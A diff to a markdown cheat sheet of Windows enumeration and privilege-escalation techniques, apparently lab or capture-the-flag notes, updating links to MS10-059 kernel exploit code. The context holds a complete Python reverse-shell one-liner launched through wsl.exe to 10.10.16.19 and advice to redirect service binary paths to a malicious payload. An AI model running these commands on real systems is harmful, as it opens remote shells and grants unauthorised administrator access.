@@ -1,6 +1,5 @@
 # Windows Enumeration
 
-
 | Command | Summary |
 | ---------------------------- | ---------------------------- |
 | ```dir <name of file> /s /p``` | Search the file system, recursively for the filename |
@@ -24,7 +23,7 @@
 | Check for Binary Path issues| See command above, its important that we can restart these services to affect them |
 | If Binary Path has issue | We can modify the path to our malicious payload, add your self to Administrators group, or use other techniques |
 | Check with PowerUp.ps1 | Make sure you have modified the script to Invoke-AllChecks |
-| Older Windows OS Win7, Win2008 | Check MS10-059 (Chimichurri) ```https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri``` |
+| Older Windows OS Win7, Win2008 | Check MS10-059 (Chimichurri) ```https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059``` |
 
 ## Common Location for WSL.exe
 ```
@@ -35,3 +34,6 @@ c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1
 ```
 c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.19",12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
+
+## Windows Kernel Exploits
+- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)
